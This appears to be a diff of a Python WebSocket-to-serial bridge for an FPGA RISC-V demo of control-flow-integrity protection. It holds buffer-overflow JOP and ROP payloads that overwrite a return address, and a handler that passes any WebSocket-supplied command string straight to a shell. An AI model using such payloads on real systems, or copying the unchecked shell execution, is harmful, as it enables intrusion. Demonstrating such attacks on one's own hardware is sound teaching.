@@ -13,9 +13,8 @@ BAUD_RATE = 921600
 
 clients = set()
 ser = None
-is_flashing = False  # 🚀 Global flag to pause UART during flashing
+is_flashing = False
 
-# Exploit Address Memory
 jop_target_address = None
 rop_target_address = None
 
@@ -23,23 +22,58 @@ ANSI_ESCAPE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
 REG_PATTERN = re.compile(r"([a-zA-Z0-9_]+)\s*:\s*(0x[0-9A-Fa-f]+)")
 
 GPR_NAMES = {
-    "zero", "ra", "sp", "gp", "tp", "t0", "t1", "t2", "s0", "s1", "a0",
-    "a1", "a2", "a3", "a4", "a5", "a6", "a7", "s2", "s3", "s4", "s5",
-    "s6", "s7", "s8", "s9", "s10", "s11", "t3", "t4", "t5", "t6",
+    "zero",
+    "ra",
+    "sp",
+    "gp",
+    "tp",
+    "t0",
+    "t1",
+    "t2",
+    "s0",
+    "s1",
+    "a0",
+    "a1",
+    "a2",
+    "a3",
+    "a4",
+    "a5",
+    "a6",
+    "a7",
+    "s2",
+    "s3",
+    "s4",
+    "s5",
+    "s6",
+    "s7",
+    "s8",
+    "s9",
+    "s10",
+    "s11",
+    "t3",
+    "t4",
+    "t5",
+    "t6",
 }
 CSR_NAMES = {
-    "mtvec", "mseccfg", "mcycle", "minstret", "ssp", "mscratch", "pmpcfg0", "pmpaddr0",
+    "mtvec",
+    "mseccfg",
+    "mcycle",
+    "minstret",
+    "ssp",
+    "mscratch",
+    "pmpcfg0",
+    "pmpaddr0",
 }
 
 
 def serial_reader(loop):
     global ser, jop_target_address, rop_target_address, is_flashing
-    
+
     stream_buffer = ""
     line_buffer = ""
 
     while True:
-        # 🚀 If flashing is active, keep the port closed and wait
         if is_flashing:
             if ser and ser.is_open:
                 try:
@@ -50,7 +84,6 @@ def serial_reader(loop):
             continue
 
         try:
-            # Reconnect automatically if port is closed
             if ser is None or not ser.is_open:
                 ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=0.01)
                 print(f"[*] Connected to FPGA on {SERIAL_PORT} at {BAUD_RATE} baud.")
@@ -65,27 +98,35 @@ def serial_reader(loop):
                     stream_buffer += chunk
                     line_buffer += chunk
 
-                    # SNOOPER LOGIC
                     if "\n" in line_buffer:
                         lines = line_buffer.split("\n")
                         for line in lines[:-1]:
                             clean_line = ANSI_ESCAPE.sub("", line)
 
-                            match_jop = re.search(r"jop_landing target :\s*(0x)?([0-9a-fA-F]+)", clean_line)
+                            match_jop = re.search(
+                                r"jop_landing target :\s*(0x)?([0-9a-fA-F]+)",
+                                clean_line,
+                            )
                             if match_jop:
                                 jop_target_address = int(match_jop.group(2), 16)
-                                print(f"\n[\033[92m+\033[0m] Snooped JOP target: 0x{jop_target_address:x}")
+                                print(
+                                    f"\n[\033[92m+\033[0m] Snooped JOP target: 0x{jop_target_address:x}"
+                                )
 
-                            match_rop = re.search(r"win_function target:\s*(0x)?([0-9a-fA-F]+)", clean_line)
+                            match_rop = re.search(
+                                r"win_function target:\s*(0x)?([0-9a-fA-F]+)",
+                                clean_line,
+                            )
                             if match_rop:
                                 rop_target_address = int(match_rop.group(2), 16)
-                                print(f"[\033[92m+\033[0m] Snooped ROP target: 0x{rop_target_address:x}")
+                                print(
+                                    f"[\033[92m+\033[0m] Snooped ROP target: 0x{rop_target_address:x}"
+                                )
 
                         line_buffer = lines[-1]
                         if len(line_buffer) > 1000:
                             line_buffer = line_buffer[-500:]
 
-                    # DASHBOARD PARSER LOGIC
                     while "\x1b[s" in stream_buffer and "\x1b[u" in stream_buffer:
                         start_idx = stream_buffer.find("\x1b[s")
                         end_idx = stream_buffer.find("\x1b[u", start_idx)
@@ -98,59 +139,65 @@ def serial_reader(loop):
                             matches = REG_PATTERN.findall(clean_frame)
                             for reg_name, hex_val in matches:
                                 if reg_name in GPR_NAMES:
-                                    send_to_frontend(loop, "telemetry", f"GPR:{reg_name}:{hex_val}")
+                                    send_to_frontend(
+                                        loop, "telemetry", f"GPR:{reg_name}:{hex_val}"
+                                    )
                                 elif reg_name in CSR_NAMES:
-                                    send_to_frontend(loop, "telemetry", f"CSR:{reg_name}:{hex_val}")
+                                    send_to_frontend(
+                                        loop, "telemetry", f"CSR:{reg_name}:{hex_val}"
+                                    )
                                 elif reg_name.startswith("PTR_"):
                                     idx = reg_name.split("_")[1]
-                                    send_to_frontend(loop, "telemetry", f"STK:{idx}:{hex_val}")
+                                    send_to_frontend(
+                                        loop, "telemetry", f"STK:{idx}:{hex_val}"
+                                    )
                         else:
                             break
 
                     if len(stream_buffer) > 10000:
                         stream_buffer = stream_buffer[-5000:]
                 else:
-                    # Small sleep to prevent 100% CPU usage while waiting for data
                     time.sleep(0.005)
 
         except Exception as e:
-            # If the port is suddenly yanked or closed due to flashing, handle it gracefully
             if not is_flashing:
                 print(f"\n[!] Serial Disconnected: {e}. Waiting to reconnect...")
             if ser:
-                try: ser.close()
-                except: pass
+                try:
+                    ser.close()
+                except:
+                    pass
             ser = None
             time.sleep(1)
 
 
 def send_to_frontend(loop, msg_type, data_str):
-    if not data_str: return
+    if not data_str:
+        return
     payload = json.dumps({"type": msg_type, "data": data_str})
     asyncio.run_coroutine_threadsafe(broadcast(payload), loop)
 
 
 async def broadcast(message):
     for client in list(clients):
-        try: await client.send(message)
-        except websockets.exceptions.ConnectionClosed: clients.remove(client)
+        try:
+            await client.send(message)
+        except websockets.exceptions.ConnectionClosed:
+            clients.remove(client)
 
 
-# 🚀 Async helper to safely flash the FPGA without freezing the dashboard
 async def perform_flash(command):
     global is_flashing, ser
     is_flashing = True
     print(f"\n[*] Preparing to flash FPGA. Suspending UART...")
-    
-    # Wait half a second to let the serial_reader thread yield and close the port
-    await asyncio.sleep(0.5) 
-    
+
+    await asyncio.sleep(0.5)
+
     print(f"[*] Executing: {command}")
-    
-    # Run the flash command completely asynchronously
+
     process = await asyncio.create_subprocess_shell(command)
-    await process.communicate() # This waits for openFPGALoader to finish!
-    
+    await process.communicate()
+
     print("[*] Flashing completed! Resuming UART connection...\n")
     is_flashing = False
 
@@ -162,13 +209,11 @@ async def ws_handler(websocket):
 
     try:
         async for message in websocket:
-            
-            # 🚀 FIX 1: Intercept the MOD message from React so it doesn't break the JSON parser
+
             if message.startswith("MOD:"):
                 print(f"[*] Frontend switched module to: {message[4:]}")
                 continue
 
-            # Handle JSON command signals
             if not message.startswith("KEY:"):
                 try:
                     cmd_data = json.loads(message)
@@ -176,17 +221,23 @@ async def ws_handler(websocket):
                         target = cmd_data.get("data")
                         print(f"[!] COMMAND TRIGGERED: {target}")
 
-                        # 🚀 FIX 2: Remove the "../" since you are running the script from the project root
                         if target == "upload_pong":
-                            await perform_flash("openFPGALoader -c ft2232 -b tangprimer20k bitstreams/pong/soc.fs")
+                            await perform_flash(
+                                "openFPGALoader -c ft2232 -b tangprimer20k bitstreams/pong/soc.fs"
+                            )
                         elif target == "upload_tetris":
-                            await perform_flash("openFPGALoader -c ft2232 -b tangprimer20k bitstreams/tetris/soc.fs")
+                            await perform_flash(
+                                "openFPGALoader -c ft2232 -b tangprimer20k bitstreams/tetris/soc.fs"
+                            )
                         elif target == "upload_safe":
-                            await perform_flash("openFPGALoader -c ft2232 -b tangprimer20k bitstreams/cfi_safe/soc.fs")
+                            await perform_flash(
+                                "openFPGALoader -c ft2232 -b tangprimer20k bitstreams/cfi_safe/soc.fs"
+                            )
                         elif target == "upload_unsafe":
-                            await perform_flash("openFPGALoader -c ft2232 -b tangprimer20k bitstreams/cfi_unsafe/soc.fs")
+                            await perform_flash(
+                                "openFPGALoader -c ft2232 -b tangprimer20k bitstreams/cfi_unsafe/soc.fs"
+                            )
 
-                        # EXPLOIT COMMANDS
                         elif target == "exploit_jop":
                             if not ser or not ser.is_open or is_flashing:
                                 print("[!] ERROR: UART not ready.")
@@ -195,8 +246,14 @@ async def ws_handler(websocket):
                                 print("[!] ERROR: Target address not snooped yet!")
                                 continue
 
-                            print(f"[\033[93m*\033[0m] Injecting JOP Payload -> 0x{jop_target_address:x}")
-                            payload = b"A" * 16 + struct.pack("<I", jop_target_address) + b"\n"
+                            print(
+                                f"[\033[93m*\033[0m] Injecting JOP Payload -> 0x{jop_target_address:x}"
+                            )
+                            payload = (
+                                b"A" * 16
+                                + struct.pack("<I", jop_target_address)
+                                + b"\n"
+                            )
                             ser.write(payload)
                             ser.flush()
 
@@ -208,44 +265,37 @@ async def ws_handler(websocket):
                                 print("[!] ERROR: Target address not snooped yet!")
                                 continue
 
-                            # --- STEP 1: CLEAR JOP PHASE ---
-                            # We send a newline to proceed through the JOP input loop 
-                            # without corrupting the 'action' pointer.
-                            print(f"[\033[94m*\033[0m] Phase 1: Sending dummy JOP bypass...")
+                            print(
+                                f"[\033[94m*\033[0m] Phase 1: Sending dummy JOP bypass..."
+                            )
                             ser.write(b"\n")
                             ser.flush()
 
-                            # --- STEP 2: WAIT FOR ROP PROMPT ---
-                            # Give the SoC a moment to process and print the ROP prompt
-                            await asyncio.sleep(0.3) 
+                            await asyncio.sleep(0.3)
 
-                            # --- STEP 3: SMASH THE STACK ---
-                            print(f"[\033[93m*\033[0m] Phase 2: Injecting ROP Stack Smash -> 0x{rop_target_address:x}")
-                            
-                            # 16 bytes to fill 'buffer[16]' 
-                            # Followed by the target address repeated to overwrite the return address
-                            payload = b"A" * 16 
+                            print(
+                                f"[\033[93m*\033[0m] Phase 2: Injecting ROP Stack Smash -> 0x{rop_target_address:x}"
+                            )
+
+                            payload = b"A" * 16
                             for _ in range(24):
                                 payload += struct.pack("<I", rop_target_address)
-                            
+
                             payload += b"\n"
                             ser.write(payload)
                             ser.flush()
                         else:
-                            # Run safe generic commands without killing serial
                             proc = await asyncio.create_subprocess_shell(target)
                             await proc.communicate()
-                            
+
                         continue
                 except Exception as e:
                     print(f"Error handling command: {e}")
                     pass
 
-            # 2. Safety block for game keys during a flash
             if not ser or not ser.is_open or is_flashing:
                 continue
 
-            # 3. Handle standard game keys
             if message.startswith("KEY:"):
                 char_to_send = message[4:]
                 ser.write(char_to_send.encode("utf-8"))
@@ -266,6 +316,7 @@ async def main():
     async with websockets.serve(ws_handler, "localhost", 8081):
         print("[*] WebSocket Bridge running on ws://localhost:8081")
         await asyncio.Future()
+
 
 if __name__ == "__main__":
     try:
